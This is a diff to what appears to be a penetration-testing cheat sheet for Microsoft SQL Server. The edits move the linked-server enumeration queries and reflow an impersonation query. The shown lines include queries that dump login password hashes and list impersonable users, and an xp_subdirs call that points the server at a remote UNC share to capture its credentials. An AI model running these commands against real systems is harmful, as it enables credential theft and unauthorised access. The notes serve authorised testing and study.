@@ -64,9 +64,7 @@ USE master
 -- Get table names
 SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
 
--- List Linked Servers
-EXEC sp_linkedservers
-SELECT * FROM sys.servers;
+
 
 -- List users
 select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
@@ -80,6 +78,9 @@ srvname                             isremote
 DESKTOP-MFERMN4\SQLEXPRESS          1
 10.0.0.12\SQLEXPRESS                0        <== isremote = 0 ===> LINKED SERVER
 
+-- List Linked Servers
+EXEC sp_linkedservers
+SELECT * FROM sys.servers;
 
 ```
 
@@ -153,11 +154,7 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 
 ```
 -- Liste des users que l'on peut "impersonate"
-SELECT distinct b.name
-FROM sys.server_permissions a
-INNER JOIN sys.server_principals b
-ON a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = 'IMPERSONATE'
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 GO
 
 -- Exploitation
